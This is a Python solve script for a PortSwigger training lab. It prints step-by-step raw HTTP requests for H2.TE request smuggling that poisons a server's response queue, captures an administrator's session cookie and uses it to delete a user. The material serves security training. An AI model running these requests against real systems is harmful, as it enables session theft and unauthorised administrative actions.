#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Response queue poisoning via H2.TE request smuggling.

Primarily documentation — the manual steps in Burp are the cleanest way to
run this. Automating HTTP/2 with a deliberately-malformed body (frame length
disagrees with the inner chunked encoding) requires low-level h2 framing
control, which is noisy to script.

Manual flow (do in Burp Repeater with Inspector → HTTP/2):

  1. Poison: send once
       POST /x HTTP/2
       Host: LAB
       Transfer-Encoding: chunked

       0

       GET /x HTTP/1.1
       Host: LAB

  2. Wait ~5s, send:
       GET / HTTP/2
       Host: LAB
     Repeat until you receive a 302 Set-Cookie: session=... (admin's).

  3. Use the stolen cookie:
       GET /admin/delete?username=carlos HTTP/2
       Host: LAB
       Cookie: session=ADMIN-TOKEN

If you want to try the automation anyway, use httpx with http2=True and a
custom transport that lets you inject the Transfer-Encoding header. Example
scaffold below.
"""

import argparse
import re
import time


MANUAL_INSTRUCTIONS = """
Manual steps (Burp Repeater, Inspector → HTTP/2):

Step 1 — Poison the response queue. Send ONCE:
----------------------------------------
POST /x HTTP/2
Host: {host}
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: {host}


----------------------------------------

Step 2 — Capture admin response. Wait ~5s, then send:
----------------------------------------
GET / HTTP/2
Host: {host}
----------------------------------------

- 404 → extra queued 404, resend
- 200 → off-by-one consumed, re-poison from Step 1
- 302 Set-Cookie: session=... → admin's post-login response, copy cookie

Step 3 — Use stolen cookie to delete carlos:
----------------------------------------
GET /admin/delete?username=carlos HTTP/2
Host: {host}
Cookie: session=STOLEN-SESSION
----------------------------------------

Connection resets every 10 requests. If stuck, send normal GETs to reset.
"""


def main():
    parser = argparse.ArgumentParser(
        description="Lab 13: H2.TE response queue poisoning (manual steps printed)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    args = parser.parse_args()

    host = re.sub(r"^https?://", "", args.lab_url.rstrip("/"))
    print(MANUAL_INSTRUCTIONS.format(host=host))


if __name__ == "__main__":
    main()
